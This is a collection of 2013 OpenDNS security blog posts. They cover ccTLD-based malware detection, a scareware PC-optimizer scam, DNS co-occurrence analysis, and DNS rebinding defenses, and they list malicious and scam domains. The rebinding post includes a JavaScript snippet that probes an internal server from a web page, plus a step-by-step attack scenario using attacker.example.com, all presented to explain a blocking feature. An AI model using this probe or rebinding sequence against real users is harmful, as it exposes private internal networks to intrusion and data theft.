{"website": "Cisco-Umbrella", "title": "The role of country code top-level domains (ccTLDs) in malware classification", "author": ["OpenDNS Security Research"], "link": "https://umbrella.cisco.com/blog/the-importance-of-cctld", "abstract": "Last week we posted an examination of whether the location of where a domain is hosted increases its likelihood to be malicious. Indeed, we confirmed that some countries are hosting a significantly higher ratio of malicious sites than clean sites. But rather than rest on a superficial assumption based on the geography of where a domain is hosted, we wanted to more deeply explore the relationship between geography, ccTLDs and malicious domains. Unlike generic top-level domains (.com, .net) that most anyone can buy, an Internet country code top-level domain (.fr, .tw) is generally reserved for a country or a dependent territory. If a website is using a specific ccTLD, it suggests that its operator’s intention to target a local audience. That said, registrars have largely relaxed the rules and a lot of ccTLDs can now be registered by non-local businesses and individuals, possibly rendering ccTLDs less relevant. The co-occurrence matrix between ccTLDs and the actual countries clients are connecting from shows a strong correlation. Most often, websites opting for a country-specific domain are actually serving content for a local audience. Looking deeper, we observe very different frequency distributions when comparing ccTLDs, that can be explained by linguistic and cultural factors. Building ccTLD-specific models is thus critical in order to help us decide whether to classify a domain as benign or malicious. Below, I’ll discuss some of the specific models we use. The servers’ physical geographic diversity The number of IP addresses and the stability of the set of IP addresses are important signals when determining whether a domain is likely to be malicious. But, it’s also very common for totally benign domains to also use multiple IPs. This is a common practice for load balancing, redundancy, optimizing latency for a large country, or to take advantage of “elastic” infrastructures. In the following experiment, we use two training sets of .RU domain names, containing only domain names resolving to more than one IP address. All IP addresses seen over a one-week period were considered. One list contains domains known to be benign and the other list contains domains known to be currently used as infection vectors. On these two sets, we computed the mean distance between the country’s geographic median and all the physical locations of servers hosting a name. We observed a significantly different skewness. Hosts serving a non-malicious domain tend to be geographically close, whereas a domain serving malware can be served by hosts spread all around the globe. Looking at the number of distinct physical locations also shows how malware can use a fast flux pattern. Fast Flux is a specific category of domains that take advantage of the fact that the set of IP addresses returned for a domain name is only valid for a limited period of time, over which the domain owner has full control. A botnet operator can leverage this feature to very quickly switch to a different set of hosts in order to serve a malicious payload. While 98% of benign domains having multiple IP addresses are only served by at most 3 datacenters, and show a negligible number of outliers, we see that malicious domains can very quickly hop from one host to another. One of them even scored 867 physical locations! Locations Domain 867 lafdamow.ru 505 girwysca.ru 443 wascadux.ru 418 ajgijuap.ru 374 jilvoqsi.ru 326 enhawcus.ru 289 taosiram.ru 253 hevlehaw.ru 242 diteqciq.ru 200 vehyfgor.ru 196 zurgovod.ru 185 sepsiqbo.ru 147 nuzejviz.ru 145 etujaqhe.ru 119 marsotrip.ru 103 zazzeqan.ru 103 azvaebyn.ru Having hopped to 92 countries, 665 ASNs, 1486 network prefixes and 2780 IP addresses in 7 days, the lafdamow.ru domain name is an obvious outlier that we quickly blocked as malware. As a researcher, outliers like this are almost impressive in their ability to change and move around so rapidly. The requester’s geographic profile Our intuition, confirmed by the co-occurrence matrix above, is that the frequency distribution of countries from which traffic is sent to ccTLD domains is predicable with a good accuracy. The .RU ccTLD, for example, shows this expected distribution for benign sites: A vast proportion of queries to .RU domains are coming from Russia, followed by Ukraine and US, other countries being almost uniformly distributed. However, we observe that malicious .RU domains show a totally different distribution of requester countries. They receive few queries from Russia, Ukraine, Belarus and Kazakhstan, and a vast majority of the queries are coming from the US. We use the Kolomogorov-Smirnov test to compare these distributions, after discarding the countries presenting a high variance and countries seen in the expected distribution, but not in our observations. In our experiments, the result of this test happens to be a pretty unreliable feature to label a domain as malicious. However, this is an extremely important feature to label a domain as benign, with only 0.02% false positives. The lexical features Domains used to serve malicious content don’t need to have any meaningful content. In fact, not having any meaningful content could even be a strategy to avoid being seen by search engines. Our intuition is that ccTLDs and languages are tightly coupled, thus domain names from a specific ccTLD show predictable lexical features. A .RU domain is likely to contain a lot of Russian-specific sequence of characters, that are unlikely to occur in a .CN domain. And sequences of characters that don’t match anything we expect in English can be very frequent in Russian. For this reason, we built a training set of .RU domain names known to be benign, from which we computed the unigrams to quadrigrams frequency distribution. We then defined a “DGA score” function, whose output represents how wrong our guess for the next character of a domain name is, considering the 1 to 4 previous characters, based on our reference frequency distribution. Pseudorandomly-generated domain names are usually easy to distinguish from human-generated, meaningful names. Thus, in the following experiment, we build a set of malicious names known for serving malware, but not part of a botnet leveraging algorithmically-generated names. This DGA score is computed for a distinct set of domain names known to be clean, and for the list of malicious names. While the lexical properties of name is far from being sufficient for classifying a domain as malicious or not, we observe that it is still an significant feature to use. The Umbrella Security Labs is now blocking 80,000,000 malicious, botnet or phishing requests each day. Given the huge variety of malware, it’s clear that there’s no one-size-fits-all model. Our team uses the three models described above to detect ccTLD-specific anomalies. While there is certainly much to gain from the use of these models, we’re relentless in our quest to identify new models and algorithms that can inform us about the likelihood of a domain’s classification.  Those models vary from general to specific, but they’re all contributing to greater protection for our customers.", "date": "2013-01-18"},
{"website": "Cisco-Umbrella", "title": "Despite DNS break, OpenDNS users can still access Instagr.am links", "author": ["David Ulevitch, Founder/CEO"], "link": "https://umbrella.cisco.com/blog/despite-dns-break-opendns-users-can-still-access-instagr-am-links", "abstract": "Twitter this morning: This morning we noticed that Instagram’s short URL, Instagr.am, wasn’t resolving. Needless to say, Insta-fans were not happy. While hundreds of people were reporting the issue on Twitter, our engineering team had a quick fix in place. We quickly tested and deployed a DNS adjustment that ensures OpenDNS users can access Instagr.am links without issue until they get their domain back up and running. In order to provide a temporary fix for the issue, we created a “false” answer that provides two IP numbers that have been recently used by insagr.am. This ensures all lookups of “instagr.am” are just mapped to Instagram servers and are correctly resolved. For unknown reasons, the Armenian chapter of ISOC which handles .am domain registrations removed the domain. Could be a mistake, a billing issue, a technical glitch or something else. That said, this morning’s issue speaks to the risk of using country code Top Level Domains for such critical services when it might not be straightforward in getting it fixed or resolved. Update: It looks like Instagram is now using full URLs for Tweets and Facebook posts in order to mitigate the issue. Update 2: Facebook reports that the .am issue has been resolved .", "date": "2013-03-21"},
{"website": "Cisco-Umbrella", "title": "Four standout trends at the Gartner Security and Risk Management Summit", "author": ["OpenDNS Team"], "link": "https://umbrella.cisco.com/blog/four-lessons-learned-at-the-gartner-security-and-risk-management-summit", "abstract": "Last week Gartner held its annual Security and Risk Management Summit outside of Washington, DC. The event draws hundreds of CIOs, CISOs, and decision-makers in IT and security from organizations all over the world. The conference schedule was aggressive, covering a broad range of important and controversial topics in security and risk management. We attended both high-level and prescriptive “how-to” sessions, and saw four important themes emerge. Here’s a closer look our top takeaways from the event: 1. There’s no such thing as a perfect security solution. In almost every session we attended, Gartner analysts were sure to make one thing clear: There’s no magic bullet for fighting off threats. If a business purchases every security solution on the market, it’s still no guarantee that its data will be protected from APTs or hackers. While this concept alone isn’t new to IT, Gartner’s suggestion for how to respond to it was enlightening. Instead of working to check off boxes on a list of security layers (firewall, secure web gateway, antivirus, etc.), or rushing out to buy the latest and greatest solution, IT and security teams would be more effective if they focused more on understanding business objectives and introducing stakeholders to the risk continuum. Raising key decision makers’ awareness of the chance of a security event, and the impact it could have on those business objectives, is an essential step toward getting a budget for a new security solution. 2. Legacy security vendors and enterprises alike are looking to startups to fill the innovation gap. We’ve talked often on this blog about how legacy security vendors are struggling to keep pace with today’s technological changes. During his keynote on Tuesday, Symantec CEO Steve Bennett explained that the future innovation path of the security giant is dependent on partnerships and integrations. When pressed further, he was candid, saying, “We bought growth. We never asked our engineers to be innovators.” So who will innovate? During a panel discussion later that day, leaders of security start-ups like Bromium and CrowdStrike shared insight on why startups are more equipped to serve the current and future needs of the market. Put simply, these agile young companies aren’t held back by history. There’s no innovator’s dilemma keeping them from building and adapting products to solve new problems. And the analysts are now hearing more enterprises ask which companies beyond the old guard they should be evaluating. 3. Securing BYOD is really hard, and no one has all the answers. Putting an effective security strategy in place for corporate-owned mobile devices is hard enough, so attempting to apply universal policies to employee-owned devices can seem downright impossible. Acknowledging that it’s an uphill battle, Gartner Analyst John Girard suggests scoping the initial mobile device policy first from the perspective of what’s possible for BYOD, and concentrating policy around the platform that the majority of users choose today (for many organizations this is iOS). Analysts suggest that using application control and MDM will become increasingly effective for securing devices owned by the business. Securing employee-owned devices, on the other hand, requires a solid investment in educating and partnering with end users. And of course, making trades. Analysts also suggest educating users on the broad impact of lost data or productivity, and shaping security in the context of employee rights and responsibilities. 4. Whether threats are advanced and persistent, or just annoying, we need to adjust the way we secure against them. Many are guilty of broadly describing cyber attacks as Advanced Persistent Threats, when perhaps we more accurately mean to say malware distribution networks or botnet infections. So it was great to see several of the presenters at the summit exploring a deeper analysis of the much-hyped phrase. Dave Monnier, Security Evangelist at Team Cymru, suggested we shift from focusing on the idea that these attacks are advanced (they’re not, he says) and start focusing on their persistence. He explained, “You can put in multiple layers of prevention technologies, but you need to spend more time on detection and mitigation. No matter how tall a wall you build, something will eventually scale it.” Gartner Analyst Lawrence Orans expanded the conversation , suggesting that as a security community we’ve got to do better than complacently expecting traditional security solutions to universally protect against threats. The issue isn’t the evolution of the threat itself, it’s where the threat makes an attack – opportunistically leveraging our once-clean device supply chain, and our massive cloud networks. Orans suggested we’d be well served to prioritize securing mobile devices that leave the secure corporate environment and heighten security for cloud networks. What are your thoughts on security at large, legacy security vendors vs. startups, BYOD, and advanced persistent threats? Leave them in the comments or share with us at @getumbrella on Twitter .", "date": "2013-06-19"},
{"website": "Cisco-Umbrella", "title": "Fake PC Optimizer Scam Uncovered", "author": ["OpenDNS Security Research"], "link": "https://umbrella.cisco.com/blog/pc-optimizer-scam", "abstract": "Utilizing the power of the Umbrella Security Graph , our Labs Team is constantly on the lookout for any anomalies that could indicate potential threats. Recently, we’ve noticed several domains that appear to be search engines triggering a number of predictive models in the Security Graph. These high-volume domains seemed to be stable, but a number of red flags quickly became apparent: demonstrated fast flux behavior, residence at low reputation IP subnets, and an alarmingly low secure rank. Although the software appeared legitimate, and the domain registered at .IN had been around for a long time, a quick investigation indicated that the sites were involved in a PC optimizing scam: websearch[.]helpmefindyour[.]info websearch[.]pu-result[.]info websearch[.]coolwebsearch[.]info websearch[.]pu-results[.]info We began by loading the websearch[.]helpmefindyour[.]info site, and saw the usual search window with an advertisement. Nothing suspicious here – until we used a outdated user agent when browsing the same site. The advertisement about fixing your ‘slow’ PC appeared. Getting a speed boost for your PC is fine, however, the changed behavior revealed by an outdated user agent resembles malicious downloads that exploit vulnerabilities of older systems. (Doesn’t it remind you of other Rogue AVs out there?) We got the executable from the site and ran it on a CLEAN VM. See the screenshots for the red alerts – they’re showing entirely made-up errors found on a clean system. In addition to a “registry cleaner”, that, of course, found things to fix on our system, we were offered the installation of two additional applications: a backup tool and another optimization tool. Several more ‘errors’ were found on our system, and only a handful of them could be fixed with the free version. Fixing the 100+ remaining issues required one to buy the product. A few minutes after having installed this tool, another window popped up informing us of 30 malware infections needing to be fixed, which required the purchase of yet another product. These executables don’t appear to be malicious per se – however, programs asking for money to install bogus PC optimizers are blatant scamware products you need to be aware of. Additional malicious domains: websearch.4shared.com\nwebsearch.a-searchpage.info\nwebsearch.coolwebsearch.info\nwebsearch.good-results.info\nwebsearch.greatresults.info\nwebsearch.helpmefindyour.info\nwebsearch.homesearchapp.info\nwebsearch.homesearch-hub.info\nwebsearch.lookforithere.info\nwebsearch.pu-result.info\nwebsearch.pur-esult.info\nwebsearch.pu-results.info\nwebsearch.resulthunters.info\nwebsearch.searchannel.info\nwebsearch.searchdwebs.info\nwebsearch.searchingissme.info\nwebsearch.searchmainia.info\nwebsearch.searchouse.info\nwebsearch.searchrocket.info\nwebsearch.simplespeedy.info\nwebsearch.soft-quick.info\nwebsearch.youwillfind.info", "date": "2013-07-17"},
{"website": "Cisco-Umbrella", "title": "Discovering Malicious Domains Using Co-Occurrences", "author": ["OpenDNS Security Research"], "link": "https://umbrella.cisco.com/blog/co-occurrences", "abstract": "[load-javascript slug=”mathjax”] The infection chain for serving a single piece of malware is frequently made of many, constantly-changing domains. The security community finds thousands of new sites serving malware or acting as intermediaries every day.  Hosts used to control botnets are also constantly changing in order to be resilient to takedowns. In this context, we need to discover and block new suspicious domains as soon as possible. In order to do so, we use different models, each of them capturing different sets of domains. Once we have evidence of a server distributing malware or acting as a command-and-control server, the first thing we usually do is try to find other domains used, or soon-to-be-used, by the same malware. From DNS queries to a discovery algorithm Let’s take a look at the data we have, and how we use it, from a given domain name, to discover new and possibly related domains. The log files we get from DNS resolvers are unstructured text files, containing the responses we send to clients (in this snippet, IPs have been made up): 2013-07-18 13:59:26.397060500 9.2 74.234.12.159 74.234.12.159 208.67.222.222 normal 0 - www.youtube.com. 1 0 - 0 800000 0 com.youtube m1.wrw\n2013-07-18 13:59:26.397062500 9.2 74.234.14.200 74.234.14.200 208.67.222.222 normal 0 - dnl-01.geo.kaspersky.com. 1 0 - 0 102000000 0 com.kaspersky m1.wrw\n2013-07-18 13:59:26.397063500 9.2 74.231.231.2 74.231.231.2 208.67.222.222 normal 0 - jelcz.sexibl.com. 1 0 - 0 0 0 com.sexibl m1.wrw\n2013-07-18 13:59:26.397065500 9.2 47.136.196.21 47.136.196.21 208.67.222.222 normal 0 - outerlink.com. 15 0 - 0 0 0 com.outerlink m1.wrw\n2013-07-18 13:59:26.397066500 9.2 93.47.212.8 93.47.212.8 208.67.222.222 normal 0 - aol.com. 15 0 - 0 80A40000 0 com.aol m1.wrw\n2013-07-18 13:59:26.397085500 9.2 91.74.34.126 91.74.34.126 208.67.222.222 normal 0 - img.zszywka.pl. 1 0 - 0 0 0 pl.zszywka m1.wrw\n2013-07-18 13:59:26.397086500 9.2 122.162.60.1 122.162.60.1 208.67.222.222 normal 0 - rtb.metrigo.com. 1 0 - 0 0 0 com.metrigo m1.wrw\n2013-07-18 13:59:26.397087500 9.2 213.199.198.182 213.199.198.182 208.67.220.220 normal 0 - www.ogame.com.ar. 1 0 - 0 800 0 ar.com.ogame m1.wrw\n2013-07-18 13:59:26.397088500 9.2 213.199.198.182 213.199.198.182 208.67.222.222 normal 0 - www.ogame.com.ar. 1 0 - 0 800 0 ar.com.ogame m1.wrw\n2013-07-18 13:59:26.397092500 9.2 176.111.228.151 176.111.228.151 208.67.222.222 normal 0 - osne.ws. 1 0 - 0 0 0 ws.osne m1.wrw\n2013-07-18 13:59:26.397093500 9.2 92.61.45.119 92.61.45.119 208.67.222.222 normal 0 - alt3.gmail-smtp-in.l.google.com. 1 0 - 0 800000 0 com.google m1.wrw\n2013-07-18 13:59:26.397094500 9.2 47.136.211.87 47.136.211.87 208.67.220.220 normal 0 - mx.dca.untd.com. 1 0 - 0 102000000 0 com.untd m1.wrw\n2013-07-18 13:59:26.397099500 9.2 47.136.211.87 47.136.211.87 208.67.222.222 normal 0 - yahoo.com. 15 0 - 0 800000 0 com.yahoo m1.wrw\n2013-07-18 13:59:26.397100500 9.2 93.127.85.16 93.127.85.16 208.67.222.222 normal 0 - mx-1.naver.com. 1 0 - 0 1000840000 0 com.naver m1.wrw\n2013-07-18 13:59:26.397101500 9.2 91.253.53.128 91.253.53.128 208.67.220.220 normal 0 - 2.s.dziennik.pl. 1 0 - 0 40000 0 pl.dziennik m1.wrw\n2013-07-18 13:59:26.397102500 9.2 74.234.15.41 74.234.15.41 208.67.220.220 normal 0 - ssl.gstatic.com. 1 0 - 0 0 0 com.gstatic m1.wrw\n2013-07-18 13:59:26.397105500 9.2 37.47.206.18 37.47.206.18 208.67.222.222 normal 0 - nickel.champlain.edu. 1 0 - 0 200000000 0 edu.champlain m1.wrw Basically, the only information we have for each query is an approximate timestamp, a client IP address, a query type and the name. Unlike web sites, there are no explicit links between resources. And unlike the HTTP protocol, the DNS protocol doesn’t provide any tracking information like refer(r)ers or cookies. An intuition, though, is that temporal proximity can be used to predict how related two domain names might be. Cleaning the data While data preparation might not sound like the most exciting step of an algorithm, it actually plays a critical role in this case. Remember that we don’t have any reliable way to identify the device that sent a query. All we see is an IP address. But home users are frequently assigned a dynamic IP address. In addition, many devices sitting behind a router can share a single external IP address. In this case, we can see many queries within a short time window, that are totally unrelated to each other. We are also observing client IP addresses sending a lot of queries in a row for a small number of domains, which can introduce bias. The first thing we do to mitigate these cases is remove entries from client IPs that have sent more queries than 99.9% of clients IPs. The assertion here is these client IPs are likely to be used by many devices at the same time. They might also be the target of a DNS amplification attack. Ignoring them improves the performance of our algorithm. We then remove duplicate (client ip, name) tuples, keeping only the most recent entries. This ensures that a pair of names can’t be seen more than once for a given IP, and reduces the number of queries for a single hour from 4 billion down to around 400 million. We also remove queries for invalid domain names, accounting for 2% of the unique (client ip, query) tuples. Temporal proximity of related malicious domains We need to validate our intuition that DNS queries for related domains might be frequently observed in a small time window. Let (M) be the set of domain names that we already flagged as malicious, and (t_i(c)) the timestamp of the first query sent by a client (c) for the domain (i). For each client, we find all the unique pairs of domains ((i,j)) so that (i,j in M^2) and (i < j). We then compute the time difference (left| t_i(c)-t_j(c) right|) which can’t be zero due to the architecture of our DNS resolvers. The histogram of (left| t_i(c)-t_j(c) right|) for all clients and all pairs of malicious domains appears to be gamma distributed, with a shape of 0.56 and a scale of 134.65, for timestamps expressed in seconds. The probability for two malicious domains looked up by a client (c) to be related can thus be expressed as [f_c(i,j) = frac{0.04 e^{-0.007 left| t_c(i)-t_c(j)right| }}{left| t_c(i)-t_c(j)right| {}^{0.436}} ] The co-occurrence score Let (D_c) be the set of domain names looked up by a client (c). In order to compute a global co-occurrence score, we define (g(i,j)) as the summation of (f_c(i,j)) for every client (c) having sent queries both for (i) and for (j). If no clients have sent a query for both (i) and (j), (g(i,j) = 0). For any given malicious domain, we could use this function to find other domains sharing the same web pages, the same infection chain, or serving the needs of the same malware sample. Unfortunately, this doesn’t work very well in practice. It’s not uncommon for malicious web sites to load resources from third-parties, like banners and social network widgets. Furthermore, users that are infected or in the process of being infected keep reading their email, and browsing common web services. For example, queries for google-analytics.com, yieldmanager.com, scorecardresearch.com, msftncsi.com and apple.com are frequently seen around the same time as queries for unrelated domains, including malicious ones. And the high co-occurrence score of these domains paired with others doesn’t help us discover new domains names that we should take a closer look at. We thus refine the function to lower the score for ((i,j)) if (j) happens to be a domain requested by a lot of client IPs. Let (D) be the set of all domain names observed. [ s(i,j) = frac{g(i,j)}{sum _{kin D} g(k,j)} ] The actual score we use is normalized: [ s'(i,j) = frac{g(i,j)}{left(sum _{kin D} g(k,j)right) sum _{kin D} s(i,k)} ] Two case studies A few months ago, suspicious queries for www1.hsbc.ca caught our attention. This name didn’t resolve, never did, and we suddently saw a spike of traffic for it. Like many .ca domain names, hsbc.ca usually gets traffic coming from clients in Canada, US and Great Britain, but what we observed for www1.hsbc.ca was also unusual: The highest co-occurrence scores for domains paired with www.hsbc.ca were: A new DGA pattern was clearly emerging here. Diving into the co-occurrences for these DGA domains unveiled many more domains following the same pattern. These domains happened to be C&C domains for the W32.Xpiro.D malware. More recently, a slew of weight loss spam hit our mailboxes. Given only one domain name, we were able to figure out more, even if they happen to be hosted on different IPs: By looking further at the co-occurrences, we also found the SEO/Social Media Marketing company which is very likely to be responsible for this campain. More use for the co-occurrence score The co-occurrence score has proven to be very useful in order to discover new domain names from domain names that we already know to be malicious. But it is also the foundation for another algorithm that can lead to new malicious domains without having to explicitly provide a starting point. This algorithm will be described in detail in a forthcoming blog post.", "date": "2013-07-24"},
{"website": "Cisco-Umbrella", "title": "Announcing New Security Categories", "author": ["Vinny LaRiza"], "link": "https://umbrella.cisco.com/blog/announcing-new-security-categories", "abstract": "We always want to ensure that we are providing the best security protection from malicious activity for our customers at all times. This is why, after careful discussion and research, we’ve added Mobile Threats, Drive-By Downloads/Exploits, High Risk Sites and Dynamic DNS categories to the security categories repertoire. The Mobile Threats category is pretty much exactly what it sounds like. Prevent threats that are specifically designed to infect your mobile devices, such as phones, tablets, phone tablets, camera phones, smart phones, cellular phones, rotary phones, etc. You want to protect your roaming clients. We want to help you protect your roaming clients. The Drive-By Download/Exploits category is to prevent against a malicious download that happens without the person’s knowledge, or better yet a download that you authorize without understanding the consequences it may have on your computer or network (i.e. Surprise!  That wasn’t actually a song you downloaded, it was a virus).  Nobody likes malware on their computer, let alone surprise malware on their computer. We’ve created this category to keep you and everyone else, from coworkers to loved ones, safe from downloading unwanted surprises. The High Risk Sites and Locations category is used to predictively protect against malicious domains. This is powered by our Umbrella Security Graph that processes terabytes of data daily from more than 50 billion Internet requests. Based on algorithmic calculations, we are able to evaluate whether or not a domain is potentially malicious enough to be blocked on your network. The Dynamic DNS category won’t be used specifically for malicious DDNS domains, however will be a catch-all for any and all Dynamic DNS domains, should a user want to be overly protective of their network. Dhia Mahjoub, one of our Security Researchers, recently released a blog about DDNS domains which takes a deeper look into the behavior of DDNS domains and how they are sometimes used for large-scale “malvertising” and targeted spear-phishing. This is the only category that will not be blocked by default. We will leave this up to your discretion to switch this category on. By adding these four new categories to Umbrella’s already-powerful security service, we’re bringing you better optimization and more customization for your networks. But wait! There’s more: as always, we’re on the lookout for the best and brightest in security to be part of our exclusive community, where you can submit malicious content to the malware and botnet categories, as well as the new categories listed above, for review. If you’re interested, drop us a line!", "date": "2013-08-08"},
{"website": "Cisco-Umbrella", "title": "That’s the Ticket – Six Questions for OpenDNS Support", "author": ["Kara Drapala"], "link": "https://umbrella.cisco.com/blog/opendns-support-interview", "abstract": "Every department at OpenDNS plays a critical role when it comes to delivering our world-class security services . However, there is one department that must wear a few different hats: engineer, researcher, teacher, among others. If you’ve read the title of this post, you’ve probably guessed that I’m talking about Support! Support is one of the major arteries of any company—OpenDNS is no different. Our amazing support team works around the clock to ensure that our customers are taken care of, no matter what the issue may be. To get some insight into what makes our support reps tick, I sat down with one of our best Customer Support Representatives, Ashley Williams: KD: So, why support? It’s not the easiest department to work in. AW: I enjoy talking to people and fixing things—letting people know they can be at ease with our products and our company in general. When people email us in a panic, we help them understand that it’s not that bad, that we’ll get through this. Our DNS service is very powerful. It’s a core Internet protocol, and sometimes that can be intimidating to users. Coming in, I had a basic understanding of DNS, but the more you learn about it, the more fascinating it becomes. We want to help people recognize that, and utilize the services we provide to the fullest extent. Being in support has also allowed me to hone some new skills: I’m definitely more efficient now! But I’ve also learned the best ways to word answers, and how to quickly understand my audience—to ascertain their level of technical skill and give them the appropriate response. KD: Is there anything you wished more people would ask? AW: I wish more people would ask about our processes: how we protect them against malware, botnets, and phishing attacks. I also wish people would understand that they need to be cognizant of network security in general: basic password security, keeping your kids out of your network, etc. KD: Do you have any tips for new users? AW: Take advantage of the Stats tool! People usually don’t enable this by default, but it’s a great tool for troubleshooting. You can also use it to search domains that need to be blocked/unblocked; it’s a lot of information that people don’t utilize. Even if you’re a beginner, you can (and should) use it to see what’s going on in your network. KD: What about from a support perspective? What can people do to improve the experience? AW: The best tip I have for people contacting support is to be as detailed as possible when submitting tickets and to follow support directions very carefully. It’s easy to be frustrated when something isn’t working, but if we say we need a screenshot, we really do need one. The faster we can diagnose the problem, the faster we can fix it for you! KD: Can you tell me a little more about the Support Team, and how they operate within the company? AW: We have an amazing team, populated with people from very different backgrounds. We’ve got security professionals, Linux admins, CS majors, etc.—very technical people who know our products inside and out in order to help customers as much as possible. At OpenDNS, we’re committed to helping each customer until their issue is completely resolved; we’ll never abandon you in the middle of fixing a problem. Another great thing about Support is that we have a very unique position here: we basically have a finger on the pulse of the company, working at the intersection of all other departments. The way our company is set up, we can easily contact someone in Engineering, Ops, Sales, or anywhere else if we need clarification on an issue. KD: What do you want customers to know about OpenDNS Support? AW: We care! We really do. From free users, to Mobility customers, to Enterprises, even to people who don’t have accounts with us – we care about you and we want to solve your issue as quickly as possible. We know you’re frustrated, and we want to help you fix it. When you email us, rest assured there is an actual person on the other end of the line reading that email, and I’m doing everything in my power to get you back on track. OpenDNS is growing, and so is the need for amazing Support Reps! Visit our Careers Page if you’d like to join Ashley and the rest of our world-class team.", "date": "2013-08-27"},
{"website": "Cisco-Umbrella", "title": "Suspicious Responses: Shining a New Light on an Old Threat", "author": ["OpenDNS Security Research"], "link": "https://umbrella.cisco.com/blog/what-are-the-suspicious-responses-and-why-you-should-block-them", "abstract": "OpenDNS users may have noticed an intriguing security feature in their dashboard: the ability to block “suspicious responses.” When enabled, this feature blocks any DNS response containing IP addresses within a private IP range: 10.0.0.0/8 172.16.0.0/12 192.168.0.0/16 254.169.0.0/16 254.169.0.0/16 192.0.2.0/24 198.51.100.0/24 203.0.113.0/24 At first, that might seem a bit weird. Why would anyone want to discard legitimate responses, that are unlikely to lead to web sites worth blocking? A recently published paper has brought new attention to how these DNS responses can be exploited; let’s take this opportunity to look at what makes these responses suspicious and how we can protect against them. Using external resources to scan a local network When a user visits http://example.com, his web browser is going to retrieve some HTML code located at this URL, and this HTML code can contain references to additional, external resources: images, stylesheets, fonts, or javascript code. These resources may be loaded from a totally different domain name. For example, it is common practice to load static content from a CDN. Unless the initial page has been secured with a Content-Security-Policy header, any page can load any content from anywhere. Firefox recently blocked mixed content (loading HTTP resources from a page served over HTTPS), but that’s pretty much the only existing restriction one can come across. This has been widely abused in the past: embedding fake images whose sources were visit trackers or targets of banner ads was a cheap and easy way to perpetrate click fraud. External resources, however, are much more interesting as an attack vector when combined with Javascript. This simple script, for example, loads an external image (but any kind of object would do the job) at a location which is typically found in web servers running JIRA: var node_img = document.createElement('object');\nnode_img.data = 'https://192.168.100.1/images/icons/issuetypes/bug.png';\nnode_img.style.visibility = 'hidden';\ndocument.body.appendChild(node_img);\nnode_img.addEventListener('load', function() {\n    console.log('JIRA has been detected');\n}); In this case, if the presence of JIRA on this server has been detected, a debug message is printed. But this information can also be sent to a remote server. What is interesting here is the server address: 192.168.100.1. An attacker serving a web page with this script at http://attacker.example.com can force a web browser to access an internal server (192.168.100.1), load a resource that possibly requires authentication (through a previously set, non-ephemeral cookie), and communicate the result back to an attacker, without the user noticing anything. And of course, what works to detect a specific piece of software on a specific server can be extended to a full scan of the victim’s local network. Taking it further using XMLHttpRequest Javascript has the ability to issue any kind of HTTP query. A GET query made using XMLHttpRequest is a convenient way to retrieve any kind of content, not just to test for its presence. This can be particularly interesting if this content is an internal Wiki or an internal Git repository containing proprietary source code. XMLHttpRequest also gives access to other verbs: if an attacker can issue a POST, DELETE or UPDATE query, he can potentially alter internal databases, send emails on the behalf of the victim, and more. For this reason, web browsers disallow cross-domain queries made that way: the host name of the initial page must match the host name of the external resource, as well as the port number and the protocol. There are mechanisms to explicitly allow cross-domain requests, but if the target is an unrelated internal server, an attacker can hardly rely on these being available. This is where DNS comes into play. The DNS rebinding attack A web site served as http://attacker.example.com/* can freely send any query to http://attacker.example.com/* and retrieve the result, but this doesn’t consider the IP addresses that attacker.example.com resolves to. Consider the following scenario: A victim is tricked into accessing http://attacker.example.com His web browser sends a DNS query to turn this name into the attacker web site IP address. The A record of the DNS response a TTL of zero. The victim visits the web site This web site performs a XMLHttpRequest query to http://attacker.example.com Because the TTL in the previous DNS response was zero, it’s not valid anymore: the browser has to resolve attacker.example.com again by sending a new DNS query This time, the resolver returns 192.168.100.1 as an IP address for this name. Because the protocol, port number, and name are the same as the initial page, the query for http://attacker.example.com is allowed by the web browser Except that the data is sent to, or retrieved from a victim’s internal server, not the initial web site. This particular attack is actually very old, and all modern web browsers defend against it by caching each name http://attacker.example.com has to resolve. If http://attacker.example.com has to be accessed more than once, the same IP address will be used every time. Failover mechanisms are also intentionally disabled: if the initial IP doesn’t accept HTTP connections any more, web browsers will not fall back to another IP until the whole page is reloaded. If that’s the case, is this attack just a relic of the past? The DNS rebinding attack, revived A few weeks ago, Yunxing Dai and Ryan Resig described a new way to conduct DNS rebinding attacks: FireDrill . Once a cache is full, inserting new entries requires evicting one or more existing entries first. This holds true for DNS caches as well, including browser DNS caches. Dai and Resig thus propose a simple yet very efficient way to force a web browser to resolve a domain name it already resolved: simply fill the browser cache by issuing other, unrelated queries. Filling the cache takes only a few seconds, and we verified that this technique still works on Google Chrome 30 and Firefox 23.0.1. Their experiment shows how dangerous DNS rebinding attacks can be by abusing a victim’s browser as a proxy. The browser keeps a websocket connection with the attacker machine, and uses rebound domain names to post and retrieve content from internal services in the victim’s network. Possible defenses against DNS rebinding attacks How can someone prevent this kind of attack? Targeted hosts are going to see an employee IP rather than the attacker IP, so IP-based filtering doesn’t help much. An HTTP query, however, usually includes the host name the client wants to reach. If attacker.example.com is being used for a DNS rebinding attack, both the attacker’s web server and the victim’s server are going to see the same header: Host: attacker.example.com Web servers receiving a query with an unregistered Host: header commonly serve one of the registered web sites. For example, Apache serves the first one, whereas Nginx serves the one with a listen ..default_server directive. One way to prevent this attack is to configure web servers to return no content for queries sent to unregistered virtual hosts. On Nginx, doing so can be as simple as adding this snippet to the configuration file: server {\n     listen 80 default_server;\n     listen [::]:80 ipv6only=on;\n     server_name _;\n     return 444;\n} Suspicious HTTP queries will be closed without any further processing. Doing so also proves to be a good way to reduce the system load when botnets are performing blind network scans to find vulnerable web servers. On the other hand, changing the HTTP server configuration is rarely an option on common devices such as printers, webcams and routers. Applications servers also rarely check the host name in client requests, on the assumption that they won’t be directly accessed by external, untrusted users. Not to mention that distributed filesystems, databases and (internal) search engines also commonly expose a HTTP/JSON interface that can become the target of a DNS rebinding attack. Blocking DNS rebinding attacks with OpenDNS OpenDNS users can enable the “block suspicious responses” option in their dashboard. This blocks DNS responses containing non-routable IP addresses, and fully protects users from the threats outlined above when browser-based safeguards fall short. This great feature has been available for free since April 2008 , and is an efficient way to neutralize DNS rebinding attacks, provided that the internal network uses these reserved IP ranges. This kind of attack may come back under the spotlight after the FireDrill paper, so we thought now would be a good time to shine a spotlight on the defense as well!", "date": "2013-09-03"},
